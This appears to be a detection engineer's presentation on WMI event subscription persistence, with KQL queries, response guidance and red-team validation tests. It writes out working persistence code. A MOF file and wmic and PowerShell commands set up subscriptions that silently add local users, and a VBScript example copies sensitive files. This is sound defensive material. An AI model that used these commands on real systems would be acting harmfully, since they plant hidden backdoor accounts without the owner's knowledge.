# WMI Event Subscription Persistence - Detection Engineer Presentation
## Goal

This alert will detect execution of malicious content triggered by a Windows Management Instrumentation (WMI) event subscription.

## Categorization

| TACTIC | TECHNIQUE | SUB-TECHNIQUE |
| --- | --- | --- |
| Persistence | Event Triggered Execution | Windows Management Instrumentation Subscription |

## Strategy Abstract

- To detect the use of WMI event triggered persistence we use the following steps:
    - Record mofcomp.exe, wmic.exe, & WmiPRVse.exe execution events with their associated command line parameters by enabling Detailed Tracking in your audit policy or by leveraging Sysmon
    - Record the creation of new WMI event consumer, filters, and filter-to-consumer bindings via Microsoft-Windows-WMI-Activity/Operational log
    - Identify mofcomp.exe parsing and loading new files into the WMI repository
    - Identify any process that is a child process of WmiPRVse.exe
    - Identify any consumers with the consumer type of Command Line
    - Identify filter-to-consumer binding utilizing the consumer name 
    - Analyze results to understand if malicious or benign


### Detections
The following KQL queries will display instances of Event Triggered Execution WMI Event Subscription:  
- Mofcomp.exe or WmiPRVse as the parent process   
```kql
event_id: 1 and (process_parent_name: wmiprvse.exe or  process_name: mofcomp.exe)
```

- WMI consumer with Command Line Consumer Type  
```kql
event_id: 20 AND wmi_consumer_type : Command Line
```
```kql
`event_id:21 AND wmi_consumer_path: "\\\\.\\ROOT\\subscription:CommandLineEventConsumer.Name=\"<INSERT_HERE>\""`  
```
- Identify any process that has the parent process of wmiprvse.exe or scrcons.exe. Additionally look for any process named mofcomp.exe or any   
```kql
process named wmic.exe and has /namespace
```
```kql
event_id: 1 and (process_parent_name: wmiprvse.exe or process_parent_name: scrcons.exe or process_name: mofcomp.exe or process_name: wmic.exe and "/namespace" )  
```
- Identify any newly created WMI consumer with Command Line or Script as the consumer type  
```kql
event_id : 20 and wmi_consumer_type : (Command Line or Script)
```

- Identify any newly created WMI Filter associated with the name of the identified consumer  
```kql
event_id : 19 and "<NAME>"
```

- Identify any newly created WMI Filter-to-Consumer binding associated with captured filter or consumer  
```kql
event_id : 21 and "<>"
```

## Technical Context

### Capability Abstraction

![detection-mapping](detection-mapping.png)

### WMI Fundamentals

- Windows Management Instrumentation (WMI) is a set of extensions to the Windows Driver Model.
- It serves as an interface through which system components can provide information about themselves.
    - Essentially, WMI facilitates the sharing of management data and operations between management applications.
- What is of particular interest for this technique is the use of consumers, filters, and filter-to-consumer bindings.
    - Consumers are either permanent or temporary listeners that respond to specific events. Upon an event's occurrence, the consumer takes actions, such as script execution or event logging.
    - Filters are WMI queries that yield results based on set conditions. They determine the triggering of an event.
    - Filter-to-Consumer Bindings are the glue that ties a filter to a consumer. It dictates that when a filter's condition is met (an event occurs), the associated consumer action is triggered.

### Mofcomp.exe

- MOF stands for Managed Object Format compiler.
- MOF files provide descriptions of data and events in WMI.
- With mofcomp.exe, these files are read and the WMI repository is subsequently updated.

### Abusing mofcomp.exe

- Adversaries can misuse mofcomp.exe to load malicious MOF files, which in turn alter the WMI repository.
- When coupled with event subscriptions, these alterations can be crafted to trigger malicious activities on specific system events.
- An attacker might use a MOF file to define a malicious event subscription. Once this MOF file is compiled using mofcomp.exe, the malicious subscription would be active:

#### Contents of evil.mof
```c++
#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")
#PRAGMA AUTORECOVER
instance of __EventFilter as $EventFilter
{
    Name = "team4_filter_test3";
    EventNamespace = "root\\CimV2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60"
            " WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            " AND TargetInstance.SystemUpTime >= 240"
            " AND TargetInstance.SystemUpTime < 325";
};

instance of CommandLineEventConsumer as $Consumer
{
    Name = "team4_consumer_test3";
    RunInteractively = false;
    CommandLineTemplate = "cmd /c net user test3baddie password /add";
};

instance of __FilterToConsumerBinding
{
    Filter = $EventFilter;
    Consumer = $Consumer;    
};
```

1. **Event Filter Creation:**
```
MOFCopy code
Query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'notepad.exe'";
QueryLanguage = "WQL";
EventNamespace = "root\\cimv2";
```
 - This portion defines an event filter with a WQL (WMI Query Language) query that monitors for the creation of a process named **`notepad.exe`**. The query will check every 5 seconds (**`WITHIN 5`**).
2. **Event Consumer Creation:**
```
MOFCopy code
instance of CommandLineEventConsumer as $Consumer {
Name = "evilConsumer";
CommandLineTemplate = "C:\\Path\\To\\MaliciousScript.bat";
};
```
- This portion defines an event consumer named "evilConsumer" that will execute the **`MaliciousScript.bat`** when triggered.
3. **Binding the Event Filter to the Event Consumer:**
```
MOFCopy code
instance of __FilterToConsumerBinding {
Filter = $Filter;
Consumer = $Consumer;
};
```
- This portion creates a binding between the event filter and the event consumer.

When this MOF file is compiled and applied to a system via `mofcomp.exe`, it will effectively monitor for the creation of the **`notepad.exe`** process and, when detected, trigger the specified **`MaliciousScript.bat`**.

### Wmic.exe

- A command-line interface to WMI, allowing users to query system information, adjust settings, and execute method calls against WMI classes.

#### Abusing WMIC to create event subscriptions

- Adversaries can leverage wmic.exe directly from the command line to establish malicious WMI event subscriptions.
- This can be done to create filters, consumers, and bindings without the need for MOF files.

#### Example use of wmic.exe to create a malicious subscription

```shell
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="evilFilter", EventNamespace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
```

- **`NAMESPACE:"\\root\subscription"`**: Specifies which WMI namespace the command will operate within. In this case, it's the **`subscription`** namespace, which deals with eventing and event consumers.
- **`PATH __EventFilter CREATE`**: This is instructing WMI to create a new event filter.
- **`Name="evilFilter"`**: Names the new event filter as "evilFilter".
- **`EventNamespace="root\cimv2"`**: Specifies the namespace for which the event query will be run against.
- **`QueryLanguage="WQL"`**: Indicates that the query is written using the WMI Query Language.
- **`Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"`**: This is the WQL query. It looks for instances where a specific WMI class (**`Win32_PerfFormattedData_PerfOS_System`**) has been modified. The **`WITHIN 60`** means it checks every 60 seconds.

#### Binding this filter to a consumer that triggers a malicious script

```shell
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="evilConsumer", CommandLineTemplate="C:\Path\To\MaliciousScript.bat"
```

- **`NAMESPACE:"\\root\subscription"`**: Specifies the WMI namespace the command will operate within. The **`subscription`** namespace is related to eventing and event consumers in WMI.
- **`PATH CommandLineEventConsumer CREATE`**: This instructs WMI to create a new command line event consumer. Command line event consumers allow for the execution of a command or script when triggered by an event filter.
- **`Name="evilConsumer"`**: Provides a name for the event consumer, in this case, "evilConsumer".
- **`CommandLineTemplate="C:\Path\To\MaliciousScript.bat"`**: Specifies the path to a batch script (or any executable) that will be run whenever the event consumer is triggered.

#### Completing the malicious subscription with the binding

```shell
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name='evilFilter'", Consumer="CommandLineEventConsumer.Name='evilConsumer'"
```

- **`NAMESPACE:"\\root\subscription"`**: This specifies which WMI namespace the command will operate within. Again, the **`subscription`** namespace is related to WMI eventing.
- **`PATH __FilterToConsumerBinding CREATE`**: This instructs WMI to create a new binding between an event filter and an event consumer.
- **`Filter="__EventFilter.Name='evilFilter'"`**: This specifies the previously created event filter named "evilFilter" as the event source.
- **`Consumer="CommandLineEventConsumer.Name='evilConsumer'"`**: This specifies the previously created event consumer named "evilConsumer" as the entity that should take action when the filter triggers.

### Scrcons.exe
scrcons.exe: The WMI Script Consumer executable. `scrcons.exe` is invoked when a `ScriptingEventConsumer` event is fired. This consumer type allows for VBScript or JScript code to be executed directly in response to an event.  

Adversary Abuse and Event-Triggered Execution  
scrcons.exe Abuse: Being the WMI Script Consumer executable, `scrcons.exe` is inherently designed to execute scripts. Malicious actors can craft WMI subscriptions that respond to certain events with the direct execution of VBScript or JScript. As this behavior is native to the WMI framework, it provides adversaries a stealthy mechanism to run their scripts.  
 Real-world Example: An attacker might set up a subscription that monitors for a specific event—say, every time a USB is plugged in. The associated action could be the execution of a VBScript that copies certain files or initiates other malevolent tasks. The script would run under `scrcons.exe`, making it seem like a legitimate system operation:  
  ```vbscript
  ' Contents of a malicious VBS that gets triggered
  Set objFSO = CreateObject("Scripting.FileSystemObject")
  Set objUSB = objFSO.GetDrive("E:") 'assuming E: is the USB drive
  If objUSB.IsReady Then
      objFSO.CopyFile "C:\sensitive_data.txt", "E:\stolen_data.txt"
  End If
  ```  
  Now, an attacker might use a WMI subscription to trigger this script every time a specific event (like a USB insertion) occurs. This execution would be facilitated by `scrcons.exe`, camouflaging the malicious


### Detection Data Model
![DetectionEntityRelationshipModel_Final.jpeg](DetectionEntityRelationshipModel_Final.jpeg)

## Blind Spots
- If the adversary is utilizing a different tool to compile mof files and import them into the mof repo  
- If the adversary is using encoded commands  
- If the consumer type is not parsed as scripting or command line  

## Assumptions
- Your environment is configured to collect Sysmon Events 1 & 19-21  
- Your environment is utilizing ELK as the SIEM

## False Positives

## Validation
Steps required to generate a representative True Positive Event (Red Scheme of Maneuver)

#### Test 1
Creating a WMI event subscription with Powershell using VBScript to add a user

Event Placed: 1804, Try 2-1833, Try 3 1914
Event Triggered: 1808, Try 2-1836, Try 3 1915 (success)

- Open PowerShell as Administrator
- Run the following commands
```powershell
$FilterArgs = @{
    Name='team4_filter_test2';
    EventNamespace='root\CimV2';
    QueryLanguage="WQL";
    Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}
$Filter=Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs

$ConsumerArgs = @{
    Name='team4_consumer_test2';
    ScriptingEngine='VBScript';
    ScriptText='
    Set objws = CreateObject("Wscript.Shell")
    objws.Run "cmd.exe /c net user test2baddie password /add", 0, True
    '
}
$Consumer=Set-WmiInstance -Namespace "root\subscription" -Class ActiveScriptEventConsumer -Arguments $ConsumerArgs

$FilterToConsumerArgs = @{
    Filter = $Filter;
    Consumer = $Consumer;
}
$FilterToConsumerBinding = Set-WmiInstance -Namespace 'root\subscription' -Class __FilterToConsumerBinding -Arguments $FilterToConsumerArgs
```

##### Cleanup Test 1
```powershell
$EventConsumerToCleanup = Get-WmiObject -Namespace root/subscription -Class ActiveScriptEventConsumer -Filter "Name = 'team4_consumer_test2'"
$EventFilterToCleanup = Get-WmiObject -Namespace root/subscription -Class __EventFilter -Filter "Name = 'team4_filter_test2'"
$FilterConsumerBindingToCleanup = Get-WmiObject -Namespace root/subscription -Query "REFERENCES OF {$($EventConsumerToCleanup.__RELPATH)} WHERE ResultClass = __FilterToConsumerBinding" -ErrorAction SilentlyContinue
$FilterConsumerBindingToCleanup | Remove-WmiObject
$EventConsumerToCleanup | Remove-WmiObject
$EventFilterToCleanup | Remove-WmiObject
```
#### Test 2
Creating Windows Event Subscription with .MOF files using commandline arguments which is triggered after system is restarted

Event Placed: 1726 UTC (parsed with error) 1740 UTC (no error)
Event Triggered: 1802 UTC

- Create MOF file

| Name | Description | Type | Default Value |
|:---:|:---:|:---:|:---:|
| mofcomp_path | Location of mofcomp.exe | string | c:\windows\system32\wbem\mofcomp.exe |
| mof_file | Local location MOF file | string | C:\Windows\Temp\bad.mof |
|  |  |  |  |

```c++
#PRAGMA NAMESPACE ("\\\\.\\root\\subscription")
#PRAGMA AUTORECOVER
instance of __EventFilter as $EventFilter
{
    Name = "team4_filter_test3";
    EventNamespace = "root\\CimV2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60"
            " WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
            " AND TargetInstance.SystemUpTime >= 240"
            " AND TargetInstance.SystemUpTime < 325";
};

instance of CommandLineEventConsumer as $Consumer
{
    Name = "team4_consumer_test3";
    RunInteractively = false;
    CommandLineTemplate = "cmd /c net user test3baddie password /add";
};

instance of __FilterToConsumerBinding
{
    Filter = $EventFilter;
    Consumer = $Consumer;    
};
```
- Locate ```mofcomp.exe``` on the system
```powershell
Get-ChildItem -Path C:\ -Filter mofcomp.exe -Recurse -ErrorAction SilentlyContinue
```
- Compile MOF file
```powershell
mofcomp.exe .\bad.mof
```
- Verify that the MOF file was compiled
```powershell
Get-WmiObject -Namespace root/CimV2 -Class CommandLineEventConsumer -Filter "Name = 'team4_consumer_test3'"
Get-WmiObject -Namespace root/CimV2 -Class __EventFilter -Filter "Name = 'team4_filter_test3'"
Get-WmiObject -Namespace root/CimV2 -Query "REFERENCES OF {__EventFilter.Name='team4_filter_test3'} WHERE ResultClass = __FilterToConsumerBinding"
```
- Verify that the event is triggered
```powershell
Get-WmiObject -Namespace root/CimV2 -Class CommandLineEventConsumer -Filter "Name = 'team4_consumer_test3'" | Invoke-WmiMethod -Name Activate
```
##### Cleanup Test 2
```powershell
Get-WmiObject -Namespace root/CimV2 -Class CommandLineEventConsumer -Filter "Name = 'team4_consumer_test3'" | Remove-WmiObject
Get-WmiObject -Namespace root/CimV2 -Class __EventFilter -Filter "Name = 'team4_filter_test3'" | Remove-WmiObject
```
#### Test 3
Creating a Windows Event Subscription using wmic.exe that executes the event after system uptime is roughly 4 minutes and adds a user
Event Placed: 1708 UTC
Event Triggered: 1713 UTC

- Create Filter
```cmd
wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="team4_filter_test4", EventNameSpace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
```
- Create Consumer
```cmd
wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="team4_consumer_test4",CommandLineTemplate="cmd.exe /c net user test4baddie password /add"
```
- Create FilterToConsumerBinding
```cmd
wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"team4_filter_test4\"",Consumer="CommandLineEventConsumer.Name=\"team4_consumer_test4\""
```

##### Cleanup Test 3
```powershell
Get-WmiObject -Namespace root/CimV2 -Class CommandLineEventConsumer -Filter "Name = 'team4_consumer_test4'" | Remove-WmiObject
Get-WmiObject -Namespace root/CimV2 -Class __EventFilter -Filter "Name = 'team4_filter_test4'" | Remove-WmiObject
```

## Priority

**CAT Levels (reference CJCSM 6510.01B)**

Category - Description

**1 - Root Level Intrusion (Incident)**   
*Malicious Filter and Consumer has been triggered*

2 - User Level Intrusion (Incident)

**3 - Unsuccessful Activity Attempt (Event)**  
*Consumer with malicious logic detected, but not triggered*

4 - Denial of Service (Incident)

5 - Non-Compliance Activity (Event)

6 - Reconnaissance (Event)

**7 - Malicious Logic (Incident)**  
*Filter with no associated malicious Consumer*

8 - Investigating (Event)

9 - Explained Anomaly (Event)

0 - Training Exercises


## Response

- Use of WMI event subscriptions for legitimate purposes is fairly uncommon. If Sysmon events 19, 20, or 21 occur, an investigation of the relevant host is warranted as this represents the possible creation of a persistence mechanism for an attacker to regain access.
- For occurrences of Sysmon event 20, inspect the wmi_consumer_type.
    - If it is “Command Line,” review the wmi_consumer_destination and/or the z_original_message for any encoded blobs as that technique often is used to obfuscate details of nefarious activity.
    - If this is the case, find the corresponding Sysmon event 19 (WMI event filter creation) for clues as to what conditions must exist (e.g. timing, system events) for the consumer to be triggered.
    - Note the namespace, which will enable investigation of Filter-to-Consumer bindings (Sysmon event 21).
- If the wmi_consumer_destination appears in plaintext, review the command line arguments for any URLs and, if available, look for any connections to the relevant IP/domain.
    - The assumption is that the use of WMI event subscriptions for persistence will attempt to connect to an attacker’s internet resource.
- Once a functional WMI event subscription is in place, the triggered action is no longer recorded by Sysmon events 19, 20, or 21; process creation would have to be inspected using the Sysmon Event 1/Event Log 4688 detection detailed above.
- If a suspicious process creation is observed, the affected host can be inspected for possible WMI event subscription abuse by utilizing the PowerShell cmdlet:
    - `Get-WmiObject -Namespace root/subscription -Class __EventConsumer`
- It is atypical to have many entries by default; specifically looking for those of class “`CommandLineEventConsumer`” or “`ActiveScriptEventConsumer`” will further highlight possible abuse. Additionally, SysInternals AutoRuns utility can enable closer inspection of many forms of persistence, including WMI Event Subscription.

## Additional Resources
- [Atomic Tests for WMI Subscription Persistence](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1546.003/T1546.003.md)
- [Example WMI Event Subscription Persistence Walkthrough](https://pentestlab.blog/2020/01/21/persistence-wmi-event-subscription/)
- [Event Consumers for WMI Event Subscriptions](https://wutils.com/wmi/root/subscription/__eventconsumer/)
- [CJCSM 6510.01B Cat Levels](https://www.jcs.mil/Portals/36/Documents/Library/Manuals/m651001.pdf?ver=2016-02-05-175710-897)
